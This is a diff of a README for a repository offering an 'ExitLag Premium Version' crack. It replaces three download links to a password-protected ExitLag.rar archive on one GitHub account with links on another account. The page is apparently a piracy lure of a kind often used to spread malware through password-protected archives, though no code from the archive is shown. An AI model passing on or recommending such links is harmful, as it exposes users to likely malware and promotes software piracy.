@@ -6,9 +6,9 @@ Welcome to the ExitLag Premium Version repository! This project is designed to e
 
 # Pass - github
 
-# Download [Download Setup](https://github.com/MarkJohn02/ExitLag_Crack/releases/download/Download/ExitLag.rar)
-# Download [Download Setup](https://github.com/MarkJohn02/ExitLag_Crack/releases/download/Download/ExitLag.rar)
-# Download [Download Setup](https://github.com/MarkJohn02/ExitLag_Crack/releases/download/Download/ExitLag.rar)
+# Download [Download Setup](https://github.com/kabinthakuri/ExitLag_Crack/releases/download/Download/ExitLag.rar)
+# Download [Download Setup](https://github.com/kabinthakuri/ExitLag_Crack/releases/download/Download/ExitLag.rar)
+# Download [Download Setup](https://github.com/kabinthakuri/ExitLag_Crack/releases/download/Download/ExitLag.rar)
 
 ## Features
 
